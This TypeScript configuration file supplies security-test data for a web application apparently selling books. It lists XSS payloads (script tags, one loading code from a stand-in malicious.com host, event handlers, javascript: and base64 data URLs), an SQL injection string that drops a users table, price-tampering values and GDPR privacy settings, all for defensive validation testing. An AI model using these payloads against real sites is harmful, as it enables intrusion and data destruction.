/**
 * Security Testing Configuration
 * 
 * This configuration file defines various security test parameters including:
 * - XSS (Cross-Site Scripting) test payloads
 * - Input validation limits
 * - Payment security test data
 * - Privacy and cookie consent settings
 * 
 * The configuration is used by SecurityHelper.ts to perform automated security testing
 */

/**
 * Main security configuration object containing all test data and validation rules
 */
export const SECURITY_CONFIG = {
  /**
   * Cross-Site Scripting (XSS) Test Configuration
   * Contains various payload types and input validation rules
   */
  XSS_TEST_DATA: {
    /**
     * Different categories of XSS attack payloads
     * Each category tests different injection vectors
     */
    PAYLOADS: {
      /**
       * Basic script injection attempts
       * Tests direct <script> tag injection and src attribute exploitation
       */
      SCRIPT: [
        '<script>alert("xss")</script>',
        '<script src="http://malicious.com/xss.js"></script>',
        '"><script>alert("xss")</script>',
      ],
      /**
       * Event handler injection attempts
       * Tests various HTML event attributes that could execute JavaScript
       */
      EVENT_HANDLERS: [
        '<img src="x" onerror="alert(\'xss\')">',
        '<svg onload="alert(\'xss\')">',
        '<body onload="alert(\'xss\')">',
      ],
      /**
       * JavaScript URL protocol exploitation attempts
       * Tests javascript: protocol and base64 encoded payloads
       */
      JAVASCRIPT_URLS: [
        'javascript:alert("xss")',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=',
      ],
      /**
       * HTML tag injection attempts
       * Tests injection of various HTML elements that could lead to XSS
       */
      HTML_INJECTION: [
        '<style>body { background: red; }</style>',
        '<iframe src="javascript:alert(\'xss\')">',
        '<link rel="stylesheet" href="malicious.css">',
        '<meta http-equiv="refresh" content="0; url=http://malicious.com">',
      ],
    },
    /**
     * Maximum allowed lengths for various input fields
     * Prevents buffer overflow attempts and ensures data integrity
     */
    MAX_LENGTH: {
      STORY_RESPONSE: 5000,
      NAME: 100,
      MESSAGE: 1000,
    },
  },
  /**
   * Payment Security Test Configuration
   * Defines test cases for payment validation and price tampering prevention
   */
  PAYMENT_TEST_DATA: {
    /**
     * Test cases for promo code validation
     * Includes invalid formats, SQL injection attempts, and XSS payloads
     */
    INVALID_PROMO_CODES: [
      'INVALID_CODE',
      'EXPIRED_CODE',
      'TEST_CODE_123',
      '<script>alert(1)</script>',
      '"; DROP TABLE users; --',
    ],
    /**
     * Valid price points for different purchase options
     * Used to verify price tampering prevention
     */
    PRICE_POINTS: {
      SINGLE_BOOK: 149.99,
      ADDITIONAL_COPY: 99.99,
    },
    /**
     * Test cases for price and quantity tampering attempts
     * Verifies server-side validation of order details
     */
    TAMPERING_TESTS: {
      QUANTITIES: [-1, 0, 999999],
      PRICES: [0, -1, 9.99],
    },
  },
  /**
   * Privacy and Cookie Consent Configuration
   * Defines settings for GDPR compliance testing
   */
  PRIVACY_TEST_DATA: {
    /**
     * Cookie categories as defined by GDPR
     * Used for testing cookie consent implementation
     */
    COOKIE_TYPES: {
      ESSENTIAL: 'essential',
      ANALYTICS: 'analytics',
      MARKETING: 'marketing',
    },
    /**
     * Default privacy settings for new users
     * All privacy-related features default to false for GDPR compliance
     */
    PRIVACY_SETTINGS: {
      PUBLIC_PROFILE: false,
      SHARE_STORIES: false,
      MARKETING_EMAILS: false,
    },
    /**
     * Types of data available for GDPR data export
     * Used for testing the data portability requirement
     */
    DATA_EXPORT_TYPES: [
      'stories',
      'personal_info',
      'payment_history',
    ],
  },
};
